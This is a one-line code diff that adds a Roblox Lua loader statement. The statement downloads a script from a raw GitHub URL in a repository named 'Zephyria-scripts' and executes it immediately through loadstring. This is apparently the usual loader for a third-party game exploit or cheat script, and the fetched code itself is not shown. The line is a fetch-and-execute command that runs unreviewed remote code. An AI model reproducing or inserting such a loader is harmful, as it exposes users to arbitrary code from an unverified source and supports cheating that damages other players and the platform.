@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zephyr1a/Zephyria-scripts/main/Zephyria"))()
